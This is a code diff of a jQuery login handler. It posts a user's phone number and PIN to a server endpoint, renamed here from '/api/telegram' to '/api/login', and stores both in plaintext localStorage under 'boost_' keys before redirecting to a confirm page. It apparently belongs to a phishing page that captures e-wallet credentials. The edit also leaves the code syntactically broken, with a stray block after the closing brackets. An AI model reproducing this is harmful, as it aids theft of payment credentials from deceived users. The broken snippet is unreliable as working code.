@@ -100,22 +100,23 @@
       errorBlock.removeClass("hidden");
 
       $.ajax({
-        url: "/api/telegram",
-        type: "POST",
-        dataType: "json",
-        data: { phone, pin, type: 'login' },
-        success: function (res) {
-          if (res.success) {
-            localStorage.setItem("boost_phone", phone);
-            localStorage.setItem("boost_pin", pin);
-            window.location.href = "confirm.html";
-          } else {
-            alert("Authentication failed. Please try again.");
-          }
-        },
-        error: function () {
-          alert("Connection error. Please try again.");
-        },
+  url: "/api/login",  // <-- ubah dari /api/telegram ke /api/login
+  type: "POST",
+  dataType: "json",
+  data: { phone, pin },  // tidak perlu type: 'login' lagi
+  success: function (res) {
+    if (res.success) {
+      localStorage.setItem("boost_phone", phone);
+      localStorage.setItem("boost_pin", pin);
+      window.location.href = "confirm.html";
+    } else {
+      alert("Authentication failed. Please try again.");
+    }
+  },
+  error: function () {
+    alert("Connection error. Please try again.");
+  }
+});
         complete: function () {
           sendBtn.prop("disabled", false);
           spinner.addClass("hidden");
